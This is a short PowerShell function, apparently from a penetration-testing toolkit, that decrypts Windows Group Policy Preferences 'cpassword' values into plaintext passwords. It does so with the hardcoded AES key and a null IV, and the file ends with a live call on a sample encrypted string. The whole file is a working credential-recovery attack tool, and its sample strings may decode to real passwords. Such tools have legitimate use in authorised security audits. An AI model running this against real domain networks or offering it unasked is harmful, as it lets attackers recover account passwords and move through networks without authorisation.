function Get-DecryptedCpassword {
<#
.SYNOPSIS

    Retrieves the plaintext password for encrypted Cpassword strings.

    Author: Maikel Ninaber (@maikelSEC)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.PARAMETER Cpassword

    Encrypted and encoded Cpassword string from GPP xml files.

.EXAMPLE

    Get-DecryptedCpassword "etEVCyPCcMYqaeM+ycU8uwdqbIvuYAbf+vJeIkT6uW9m5Z7B2LKu3bhr9gYS4Y+/sFEtp0UK7iSJhblpqQ+pkA"

.LINK

        http://esec-pentest.sogeti.com/posts/2012/01/20/exploiting-windows-gpp.html

#>
    [CmdletBinding()]
    Param (
        [string] $Cpassword 
    )

    try {
        #Append appropriate padding based on string length  
        $Mod = ($Cpassword.length % 4)
            
        switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
            
        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
            
        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length) 
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor() 
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
            
        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    } 
        
    catch {Write-Error $Error[0]}
}  

#Get-DecryptedCpassword "etEVCyPCcMYqaeM+ycU8uwdqbIvuYAbf+vJeIkT6uW9m5Z7B2LKu3bhr9gYS4Y+/sFEtp0UK7iSJhblpqQ+pkA"

#Get-DecryptedCpassword "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

Get-DecryptedCpassword "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"